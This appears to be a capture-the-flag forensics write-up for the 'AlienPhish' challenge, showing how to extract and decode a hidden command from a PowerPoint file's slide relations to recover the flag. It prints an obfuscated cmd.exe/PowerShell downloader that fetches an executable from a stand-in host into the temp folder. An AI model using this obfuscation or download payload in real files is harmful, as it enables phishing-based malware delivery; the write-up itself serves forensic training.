---
layout: load_md
title: The White Circle | Cyber Apocalypse 2021 | AlienPhish Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2021
parent: cyber_apocalypse_2021
category: forensics
challenge: AlienPhish
tags: "forensics, starry, macros"
date: 2021-04-24T00:00:00+00:00
last_modified_at: 2021-04-24T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2021</h1>

## AlienPhish

> Solved by : Starry-Lord

* Unzip and find 'Alien Weaknesses.pptx'
* Unzip again and go to ppt/slides/_rels/
* Read slide1.xml.rels to find a suspicious relation tag

```
    cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22
```

* Go to cyberchef 
* From url decode 
* Reverse 

```
    "%=!XCk*:XCk% llac 0 qel X% fi;pma&;pma&!1,X%~:My!!XCk!=XCk tes od)0;1-;221( ni X% L/ rof;pma&;pma&powershell -c "$o = $env:temp   'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe'; iwr http:/destroyearth.alien/x.exe -outfile $o"=My tes"C/NO:V/ exe.dmc
```

```
    Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99
```

* From base64 and select the urlSafe alphabet

```
CHTB{pH1sHiNg_w0_m4cr0s???}
```

